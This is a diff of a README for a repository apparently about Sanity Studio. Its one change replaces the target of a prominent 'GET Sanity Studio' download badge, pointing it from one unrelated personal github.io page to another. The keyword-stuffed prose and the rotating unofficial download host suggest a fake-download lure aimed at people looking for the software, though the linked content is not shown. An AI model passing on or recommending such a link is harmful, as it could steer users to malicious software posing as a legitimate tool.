@@ -54,7 +54,7 @@ A repository for Sanity Studio should highlight how the product supports schema 
 
 Prerequisites: A JavaScript development environment, access to the Sanity project, and familiarity with content types, datasets, and the basic goals of the publishing workflow.
 
-[![GET Sanity Studio](https://img.shields.io/badge/GET%20%E2%80%94%20Sanity%20Studio-0078D6?style=for-the-badge&logoColor=white)](https://nelsonleblancniei.github.io/.github/sanity-studio-app)
+[![GET Sanity Studio](https://img.shields.io/badge/GET%20%E2%80%94%20Sanity%20Studio-0078D6?style=for-the-badge&logoColor=white)](https://erenlopezmgpm.github.io/.github/sanity-studio-app)
 
 1.  **Download and Install:** Begin with Sanity Studio download or Sanity Studio install steps from the official tooling, then connect the local project to the correct sanity io workspace.
 2.  **Define the Content Model:** Create Sanity Studio schema files for pages, posts, media, authors, product entries, navigation, settings, or any structured content your project needs.
